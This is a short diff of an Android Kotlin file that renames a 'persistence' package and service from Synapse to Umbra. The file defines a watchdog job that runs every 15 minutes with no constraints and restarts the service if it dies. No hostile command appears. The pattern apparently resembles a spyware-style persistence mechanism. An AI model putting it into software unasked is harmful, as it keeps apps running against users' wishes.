@@ -1,4 +1,4 @@
-package org.synapse.core.persistence
+package org.umbra.core.persistence
 
 import android.app.job.JobInfo
 import android.app.job.JobParameters
@@ -11,12 +11,12 @@ import android.util.Log
 /**
  * JobScheduler-based secondary watchdog. Fires every 15 minutes.
  * Always runs — no battery/idle constraints.
- * Checks if the SynapseService is alive; restarts it if dead.
+ * Checks if the UmbraService is alive; restarts it if dead.
  */
 class WatchdogJob : JobService() {
 
     companion object {
-        private const val TAG = "Synapse"
+        private const val TAG = "Umbra"
         private const val JOB_ID = 9002
 
         fun schedule(context: Context) {
